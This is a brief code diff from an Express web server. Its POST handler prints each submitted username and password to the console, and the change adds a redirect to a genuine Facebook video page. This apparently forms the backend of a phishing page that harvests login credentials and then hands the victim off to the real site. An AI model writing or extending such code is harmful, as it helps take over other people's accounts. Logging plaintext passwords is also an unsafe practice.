@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
 app.post('/', function(req, res) {
   console.log(req.body.username)
   console.log(req.body.password)
-
+  res.redirect('https://www.facebook.com/watch/?v=1411538705903643&extid=stIn4t3yjvF8SA5X')
 });
 
 app.listen(port, () => {
